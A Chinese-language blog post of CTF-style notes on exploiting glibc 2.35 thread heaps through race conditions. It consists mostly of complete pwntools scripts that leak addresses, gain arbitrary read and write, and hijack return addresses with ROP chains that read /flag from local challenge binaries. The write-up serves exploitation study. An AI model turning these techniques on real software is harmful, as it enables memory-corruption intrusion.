---
layout: post
tags: [pwn]
title: "glibc 2.35 thread-heap: arenas 利用手法"
author: wsxk
date: 2025-5-20
comments: true
---

- [0. glibc 2.35与 glibc 2.31的区别](#0-glibc-235与-glibc-231的区别)
- [1. arbitrary read](#1-arbitrary-read)
  - [1.1 高版本内核泄露thread stack的方法](#11-高版本内核泄露thread-stack的方法)
  - [1.2 任意地址读.bss(带pie)](#12-任意地址读bss带pie)
  - [1.3 任意地址读main stack](#13-任意地址读main-stack)
  - [1.4 任意地址读 main heap](#14-任意地址读-main-heap)
- [2. arbitrary write](#2-arbitrary-write)
  - [2.1 线程以return结束](#21-线程以return结束)
  - [2.2 线程以pthread\_exit()结束](#22-线程以pthread_exit结束)

`thread heap的利用手法多数都是依靠race condition来获取任意地址读写的能力，辅以一些常见的tips即可完成利用`<br>
**任意地址读写的说法其实也适用于其他的利用手法,从这个角度来思考安全问题是很有意义的**<br>
# 0. glibc 2.35与 glibc 2.31的区别<br>
最主要的区别在于移除了`free_hook`等之前非常好用的符号,已经`safe-linking`机制:<br>
参考这篇文章：[https://wsxk.github.io/safelinking/](https://wsxk.github.io/safelinking/)<br>
另外在调试glibc2.35可以发现：glibc2.35中的`tcache->key`部分也发生了修改，不再是`tcache_perthread_struct`了，而是真的随机的值.如下图所示：<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250518105647.png)
总之，`tcache->key`部分已经没有了价值，但是`tcache->next`部分非常有用。<br>

# 1. arbitrary read<br>
**利用arbitrary read可以任意读取.bss段（没有添加PIE）、Thread heap、libc、Thread stack(主要利用第一个线程的栈空间与libc没有间隔)、main_stack、main_heap中的数据（前提是知道地址）**<br>
race的利用难度主要在于调试（个人理解）<br>

```python
from pwn import *
import os

#binary_path = "/challenge/babyprime_level1.1"
binary_path = './babyprime_level1.1'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_struct_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(100000):
                r1.sendline(b"malloc %d scanf %d AAAAAAAABBBBBBBB free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(100000):
            r2.sendline(b"printf %d" % idx)
        os.wait()
        r1.clean()
        output = r2.clean()
        try:
            result = set(output.split(b"\n"))
            print(result)
            #pause()
            leak  = next(x for x in result if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17].ljust(8,b"\x00"))
            if leak & 0xff != 0:
                print("leak error, try again!!!")
                continue
            break 
        except Exception as e:
            print(f"error:{e}")
            print(f"leak pthread_struct_addr try again!!!")
    idx += 1
    return leak

def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d" %(idx,idx+1,idx+1))
    while True:
        if os.fork() == 0:
            r1.sendline(b"free %d" %(idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "% (idx) + p64(addr)+b"BBBBBBBB\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d printf %d"%(idx,idx))
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.clean()
    r1.sendline(b"printf %d"% (idx+1))
    r1.recvuntil(b"MESSAGE: ")
    value = u64(r1.recvline().strip(b"\n").ljust(8,b"\x00"))
    return value

# gdb.attach(p,"continue\n")
# pause()
# r1.sendline(b"malloc 1")
# r1.sendline(b"scanf 1 AAAAAAAABBBBBBBB free 1")
# r2.sendline(b"malloc 2")
# r2.sendline(b"scanf 2 CCCCCCCCDDDDDDDD free 2")
# pause()
pthread_struct_addr = leak_pthread_struct_addr(r1,r2)<< 12
log.success(f"pthread_struct_addr: {hex(pthread_struct_addr)}")
secret = arbitrary_read(r1,r2,(pthread_struct_addr>>12)^0x405460)
log.success(f"secret: {hex(secret)}")
r1.sendline(b"send_flag")
r1.recvuntil(b"Secret: ")
r1.sendline(p64(secret))
output = r1.clean()
print(output)
p.interactive()
```
## 1.1 高版本内核泄露thread stack的方法<br>
时代在变化！高版本内核（具体到多少不清楚）在创建新线程时，第一个线程的`thread stack`空间不再紧邻`libc`，我们需要其他的方法泄露`thread stack`<br>
**核心思路是得知libc的地址后，可以在ld中搜索指向thread stack内存映射区域的指针，ld和libc的内存映射是相邻的！！！**<br>
`p2p  search_mmap_region target_mmap_region`<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250524235643.png)
这里给个例子：<br>
```python
import os
from pwn import *

binary_path = "/challenge/babyprime_level3.0"
#binary_path = './babyprime_level3.0'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(10000):
                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(10000):
            r2.sendline(b"printf %d"%(idx))
        os.wait()
        r1.clean()
        try:
            output = r2.clean()
            output = set(output.split(b'\n'))
            print(output)
            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17])
            break
        except Exception as e:
            print(f"error: {e}")
            print("try leak pthread_addr again")
    idx += 1
    return leak
# 相比之前能快速提高命中率！
def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True: 
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d"%(idx,idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d"% idx)
        r1.sendline(b"printf %d"% idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        #print("output:",output)
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.sendline(b"printf %d" %(idx+1))
    r1.recvuntil(b"MESSAGE: ")
    output = r1.recvline().strip(b"\n")
    idx += 2
    return output


gdb.attach(p,"continue\n")
pause()
pthread_addr = leak_pthread_addr(r1,r2)<<12
log.success(f"pthread_addr: {hex(pthread_addr)}")
libc_addr_ptr = pthread_addr + 0x8a0

libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
log.success(f"libc_addr: {libc_addr}")
libc_addr = u64(libc_addr.ljust(8,b"\x00"))
log.success(f"libc_addr: {hex(libc_addr)}")
ld_addr = libc_addr + 0x10380
log.success(f"ld_base: {hex(ld_addr)}")
pthread_stack_ptr = ld_addr + 0x3b0b0
log.success(f"pthread_stack_ptr: {hex(pthread_stack_ptr)}")

thread_stack_addr = arbitrary_read(r1,r2, pthread_stack_ptr^((pthread_addr+0x1000)>>12))
thread_stack_addr = u64(thread_stack_addr.ljust(8,b"\x00"))-0x28f0
log.success(f"thread_stack_addr: {hex(thread_stack_addr)}")
#context.log_level='debug'
secret = arbitrary_read(r1,r2,thread_stack_addr^((pthread_addr+0x2000)>>12))
log.success(f"secret: {secret}")

r1.clean()
r1.sendline(b"send_flag")
r1.recvuntil(b"Secret: ")
r1.sendline(secret)
output = r1.clean()
print(output)
p.interactive()
```
## 1.2 任意地址读.bss(带pie)<br>
只需泄露stack上的program地址即可<br>
```python
import os
from pwn import *
#context.terminal = ['tmux','splitw','-h']
binary_path = "/challenge/babyprime_level4.1"
#binary_path = './babyprime_level4.1'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(10000):
                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(10000):
            r2.sendline(b"printf %d"%(idx))
        os.wait()
        r1.clean()
        try:
            output = r2.clean()
            output = set(output.split(b'\n'))
            print(output)
            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17])
            break
        except Exception as e:
            print(f"error: {e}")
            print("try leak pthread_addr again")
    idx += 1
    return leak

def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True:
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d"%(idx,idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d"% idx)
        r1.sendline(b"printf %d"% idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        #print("output:",output)
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.sendline(b"printf %d" %(idx+1))
    r1.recvuntil(b"MESSAGE: ")
    output = r1.recvline().strip(b"\n")
    idx += 2
    return output


#gdb.attach(p,"continue\n")
#pause()
# step 1 : leak pthread heap addr
pthread_addr = leak_pthread_addr(r1,r2)<<12
log.success(f"pthread_addr: {hex(pthread_addr)}")

# step 2 : leak libc addr
libc_addr_ptr = pthread_addr + 0x8a0
libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
log.success(f"libc_addr: {libc_addr}")
libc_addr = u64(libc_addr.ljust(8,b"\x00"))
log.success(f"libc_addr: {hex(libc_addr)}")

# step 3 : leak program addr
main_addr_ptr = libc_addr - 0x21cce0
log.success(f"main_addr_ptr: {hex(main_addr_ptr)}")
main_addr = arbitrary_read(r1,r2,main_addr_ptr^((pthread_addr+0x1000)>>12))
main_addr = u64(main_addr.ljust(8,b"\x00"))
log.success(f"main_addr: {main_addr}")

# step 4 : leak secret
secret_addr = main_addr-0x2023 + 0x5370
log.success(f"secret_addr: {hex(secret_addr)}")
secret = arbitrary_read(r1,r2, secret_addr^((pthread_addr+0x2000)>>12))

r1.clean()
r1.sendline(b"send_flag")
r1.recvuntil(b"Secret: ")
r1.sendline(secret)
output = r1.clean()
print(output)
p.interactive()
```
## 1.3 任意地址读main stack<br>
原理很简单，泄露libc后，在里面找`main stack`的指针即可<br>
```python
import os
from pwn import *
#context.terminal = ['tmux','splitw','-h']
binary_path = "/challenge/babyprime_level5.1"
#binary_path = './babyprime_level5.1'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(10000):
                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(10000):
            r2.sendline(b"printf %d"%(idx))
        os.wait()
        r1.clean()
        try:
            output = r2.clean()
            output = set(output.split(b'\n'))
            print(output)
            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17])
            break
        except Exception as e:
            print(f"error: {e}")
            print("try leak pthread_addr again")
    idx += 1
    return leak

def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True:
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d"%(idx,idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d"% idx)
        r1.sendline(b"printf %d"% idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        #print("output:",output)
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.sendline(b"printf %d" %(idx+1))
    r1.recvuntil(b"MESSAGE: ")
    output = r1.recvline().strip(b"\n")
    idx += 2
    return output


# gdb.attach(p,"continue\n")
# pause()
# step 1 : leak pthread heap addr
pthread_addr = leak_pthread_addr(r1,r2)<<12
log.success(f"pthread_addr: {hex(pthread_addr)}")

# step 2 : leak libc addr
libc_addr_ptr = pthread_addr + 0x8a0
libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
log.success(f"libc_addr: {libc_addr}")
libc_addr = u64(libc_addr.ljust(8,b"\x00"))
log.success(f"libc_addr: {hex(libc_addr)}")

#pause()
# step 3 : leak stack addr
stack_ptr = libc_addr + 0xda0
log.success(f"stack_ptr: {hex(stack_ptr)}")
stack_addr = arbitrary_read(r1,r2,stack_ptr^((pthread_addr+0x1000)>>12))
stack_addr = u64(stack_addr.ljust(8,b"\x00"))
log.success(f"stack_addr: {hex(stack_addr)}")


# step 4 : leak secret
secret_addr = stack_addr-0x128
log.success(f"secret_addr: {hex(secret_addr)}")
secret = arbitrary_read(r1,r2, secret_addr^((pthread_addr+0x2000)>>12))
log.success(f"secret: {secret}")

# step 5 : bruteforce
for i in range(26):
    payload = bytes([i+97])+secret
    r1.clean()
    r1.sendline(b"send_flag")
    r1.recvuntil(b"Secret: ")
    r1.sendline(payload)
    output = r1.clean()
    if b"pwn" in output:
        print(output)
        break
p.interactive()
```

## 1.4 任意地址读 main heap<br>
**核心思想是利用libc中的main_arena**<br>
```python

import os
from pwn import *
#context.terminal = ['tmux','splitw','-h']
binary_path = "/challenge/babyprime_level6.1"
#binary_path = './babyprime_level6.1'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(10000):
                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(10000):
            r2.sendline(b"printf %d"%(idx))
        os.wait()
        r1.clean()
        try:
            output = r2.clean()
            output = set(output.split(b'\n'))
            print(output)
            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17])
            break
        except Exception as e:
            print(f"error: {e}")
            print("try leak pthread_addr again")
    idx += 1
    return leak

def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True:
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d"%(idx,idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d"% idx)
        r1.sendline(b"printf %d"% idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        #print("output:",output)
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.sendline(b"printf %d" %(idx+1))
    r1.recvuntil(b"MESSAGE: ")
    output = r1.recvline().strip(b"\n")
    idx += 2
    return output


# gdb.attach(p,"continue\n")
# pause()
# step 1 : leak pthread heap addr
pthread_addr = leak_pthread_addr(r1,r2)<<12
log.success(f"pthread_addr: {hex(pthread_addr)}")

# step 2 : leak libc addr
libc_addr_ptr = pthread_addr + 0x8a0
libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
log.success(f"libc_addr: {libc_addr}")
libc_addr = u64(libc_addr.ljust(8,b"\x00"))
log.success(f"libc_addr: {hex(libc_addr)}")

#pause()
# step 3 : leak main heap addr
main_heap_ptr = libc_addr + 0x60
log.success(f"main_heap_ptr: {hex(main_heap_ptr)}")
main_heap_addr = arbitrary_read(r1,r2,main_heap_ptr^((pthread_addr+0x1000)>>12))
main_heap_addr = u64(main_heap_addr.ljust(8,b"\x00"))
log.success(f"main_heap_addr: {hex(main_heap_addr)}")


# step 4 : leak secret
secret_addr = main_heap_addr-0x2b0
log.success(f"secret_addr: {hex(secret_addr)}")
secret = arbitrary_read(r1,r2, secret_addr^((pthread_addr+0x2000)>>12))
log.success(f"secret: {secret}")
r1.clean()
r1.sendline(b"send_flag")
r1.recvuntil(b"Secret: ")
r1.sendline(secret)
output = r1.clean()
print(output)

p.interactive()
```

# 2. arbitrary write<br>
任意读+任意写，加上某个地址的泄露，通常我们就能够开始写利用脚本获取shell了！<br>
## 2.1 线程以return结束<br>
```python
import os
from pwn import *
#context.terminal = ['tmux','splitw','-h']
binary_path = "/challenge/babyprime_level7.1"
#binary_path = './babyprime_level7.1'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(10000):
                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(10000):
            r2.sendline(b"printf %d"%(idx))
        os.wait()
        r1.clean()
        try:
            output = r2.clean()
            output = set(output.split(b'\n'))
            print(output)
            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17])
            break
        except Exception as e:
            print(f"error: {e}")
            print("try leak pthread_addr again")
    idx += 1
    return leak

def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True:
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d"%(idx,idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d"% idx)
        r1.sendline(b"printf %d"% idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        #print("output:",output)
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.sendline(b"printf %d" %(idx+1))
    r1.recvuntil(b"MESSAGE: ")
    output = r1.recvline().strip(b"\n")
    idx += 2
    return output

def arbitrary_write(r1,r2,addr,payload):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True:
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d" %(idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(2000):
            r2.sendline(b"scanf %d "%(idx)+p64(addr))
        os.wait()
        r1.sendline(b"malloc %d" % idx)
        r1.sendline(b"printf %d" % idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.sendline(b"scanf %d"%(idx+1)+payload)
    idx += 2
    return

#gdb.attach(p,"continue\n")
#pause()
# step 1 : leak pthread heap addr
pthread_addr = leak_pthread_addr(r1,r2)<<12
log.success(f"pthread_addr: {hex(pthread_addr)}")

# step 2 : leak libc addr
libc_addr_ptr = pthread_addr + 0x8a0
libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
log.success(f"libc_addr: {libc_addr}")
libc_addr = u64(libc_addr.ljust(8,b"\x00"))
log.success(f"libc_addr: {hex(libc_addr)}")
libc_base = libc_addr - 0x219c80
log.success(f"libc_base: {hex(libc_base)}")

# step 3 : overwrite ret_addr to ROP
stored_rbp_addr = libc_addr - 0x21de90 # 0x10 alignment
log.success(f"stored_rip_addr: {hex(stored_rbp_addr)}")
libc = p.elf.libc
libc.address = libc_base
context.arch = 'amd64'
rop_chain = ROP(libc,badchars=b" \t\n\r\x0b\x0c")
rop_chain.call("read",[0,libc.bss(0x123),42])
rop_chain.call("close",[8])
rop_chain.call("open",[libc.bss(0x123),0])
rop_chain.call("sendfile",[1,8,0,1024])
rop_chain.call("exit",[42])
arbitrary_write(r1,r2,stored_rbp_addr^((pthread_addr+0x1000)>>12),p64(0x4141414141414141)+rop_chain.chain())
log.success(f"write ok")

context.log_level = 'debug'
#pause()
r1.sendline(b"quit")
p.send(b"/flag\x00")
print("leak: ",{p.readall()})
print("exit: ",{p.poll()})
p.interactive()
```

## 2.2 线程以pthread_exit()结束<br>
**核心思路是劫持scanf的返回地址！（即用scanf写入的缓冲区，位于scanf的返回地址附近！）**<br>
```python
import os
from pwn import *
#context.terminal = ['tmux','splitw','-h']
binary_path = "/challenge/babyprime_level8.0"
#binary_path = './babyprime_level8.0'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(10000):
                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(10000):
            r2.sendline(b"printf %d"%(idx))
        os.wait()
        r1.clean()
        try:
            output = r2.clean()
            output = set(output.split(b'\n'))
            print(output)
            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17])
            break
        except Exception as e:
            print(f"error: {e}")
            print("try leak pthread_addr again")
    idx += 1
    return leak

def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True:
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d"%(idx,idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d"% idx)
        r1.sendline(b"printf %d"% idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        #print("output:",output)
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.sendline(b"printf %d" %(idx+1))
    r1.recvuntil(b"MESSAGE: ")
    output = r1.recvline().strip(b"\n")
    idx += 2
    return output

def arbitrary_write(r1,r2,addr,payload):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
    while True:
        if os.fork() == 0:
            for _ in range(2000):
                r1.sendline(b"malloc %d free %d" %(idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(2000):
            r2.sendline(b"scanf %d "%(idx)+p64(addr))
        os.wait()
        r1.sendline(b"malloc %d" % idx)
        r1.sendline(b"printf %d" % idx)
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    # pause()
    r1.sendline(b"scanf %d"%(idx+1)+payload)
    idx += 2
    return

#gdb.attach(p,"b *$rebase(0x1A86)\ncontinue\n")
#pause()
# step 1 : leak pthread heap addr
pthread_addr = leak_pthread_addr(r1,r2)<<12
log.success(f"pthread_addr: {hex(pthread_addr)}")

# step 2 : leak libc addr
libc_addr_ptr = pthread_addr + 0x8a0
libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
log.success(f"libc_addr: {libc_addr}")
libc_addr = u64(libc_addr.ljust(8,b"\x00"))
log.success(f"libc_addr: {hex(libc_addr)}")
libc_base = libc_addr - 0x219c80
log.success(f"libc_base: {hex(libc_base)}")

# step 3 : overwrite ret_addr to ROP
stored_rbp_addr = libc_addr - 0x21e2f0 -0x20 # 0x10 alignment，并且是scanf的返回地址-0x28的位置
log.success(f"stored_rip_addr: {hex(stored_rbp_addr)}")
libc = p.elf.libc
libc.address = libc_base
context.arch = 'amd64'
rop_chain = ROP(libc,badchars=b" \t\n\r\x0b\x0c")
rop_chain.call("read",[0,libc.bss(0x123),42])
rop_chain.call("close",[8])
rop_chain.call("open",[libc.bss(0x123),0])
rop_chain.call("sendfile",[1,8,0,1024])
rop_chain.call("exit",[42])
arbitrary_write(r1,r2,stored_rbp_addr^((pthread_addr+0x1000)>>12),p64(0x4141414141414141)*5+rop_chain.chain())
log.success(f"write ok")

context.log_level = 'debug'
# pause()
# r1.sendline(b"quit")
p.send(b"/flag\x00")
print("leak: ",{p.readall()})
print("exit: ",{p.poll()})
p.interactive()
```

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>